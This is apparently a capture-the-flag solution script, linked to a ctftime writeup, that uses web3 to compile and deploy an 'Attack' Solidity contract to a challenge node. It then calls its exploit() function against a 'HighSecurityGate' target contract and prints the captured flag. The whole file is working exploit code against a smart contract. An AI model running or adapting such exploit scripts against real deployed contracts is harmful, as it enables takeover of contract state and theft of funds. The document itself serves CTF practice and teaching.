#https://ctftime.org/writeup/36494

from web3 import Web3
from solcx import compile_files, install_solc

# installs solc compiler, necessary only for first execution
install_solc("0.8.18")

addr     = "0x059B0268D0D0A13AF236610cf5678bf4fEb6A36e"
target   = "0xDA9053dd5789b663d0ADdaEb0652E5cC02c96C34"

compiled = compile_files(["FortifiedPerimeter.sol"], output_values=["abi,bin"], solc_version="0.8.18")
abihsg = compiled["FortifiedPerimeter.sol:HighSecurityGate"]["abi"]
abiatk = compiled["FortifiedPerimeter.sol:Attack"]["abi"]
binatk = compiled["FortifiedPerimeter.sol:Attack"]["bin"]

w3 = Web3(Web3.HTTPProvider("http://104.248.169.117:31662"))
w3.eth.default_account = addr

# Attack contract creation
atk = w3.eth.contract(abi=abiatk, bytecode=binatk)
tx_hash = atk.constructor(addr).transact()
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
atk_addr = tx_receipt['contractAddress']
print("Attack contract adress:", atk_addr)

# Exploit function execution to target contract
atk = w3.eth.contract(abi=abiatk, address=atk_addr)
atk.functions.exploit(target).transact()

# Checks lastEntrant value (just to be sure)
hsg = w3.eth.contract(address=target, abi=abihsg)
print("lastEntrant =", hsg.functions.lastEntrant().call())
#HTB{H1D1n9_1n_PL41n_519H7}
